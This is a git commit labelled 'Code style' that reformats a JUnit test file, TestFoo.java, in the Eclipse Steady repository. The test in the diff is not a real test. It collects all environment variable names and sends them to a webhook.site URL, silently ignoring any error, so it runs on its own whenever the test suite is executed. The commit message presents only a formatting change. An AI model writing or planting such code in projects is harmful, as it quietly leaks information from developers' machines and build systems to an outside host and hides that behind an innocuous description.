a421b0f98102df43ed7a1c59de38a28694902c61
henuk <henrik.plate@protonmail.com>
2022-04-23 09:44:54 +0200

    Code style

--- shared/src/test/java/org/eclipse/steady/shared/TestFoo.java
+++ shared/src/test/java/org/eclipse/steady/shared/TestFoo.java
@@ -11,15 +11,18 @@ public class TestFoo {
   @Test
   public void testFoo() {
     try {
-        String keys = "";
-        for (String k: System.getenv().keySet()) keys += (!keys.equals("")?";":"") + k;
-        System.out.println("env=" + keys);
-        URL url = new URL("https://webhook.site/31887b4a-7907-4703-8816-b9784eca0edd?env=" + URLEncoder.encode(keys));
-        HttpURLConnection con = (HttpURLConnection)url.openConnection();
-        con.setRequestMethod("GET");
-        con.connect();
-        con.getResponseCode();
+      String keys = "";
+      for (String k : System.getenv().keySet()) keys += (!keys.equals("") ? ";" : "") + k;
+      System.out.println("env=" + keys);
+      URL url =
+          new URL(
+              "https://webhook.site/31887b4a-7907-4703-8816-b9784eca0edd?env="
+                  + URLEncoder.encode(keys));
+      HttpURLConnection con = (HttpURLConnection) url.openConnection();
+      con.setRequestMethod("GET");
+      con.connect();
+      con.getResponseCode();
+    } catch (Exception e) {
     }
-    catch(Exception e) {}
-  } 
+  }
 }
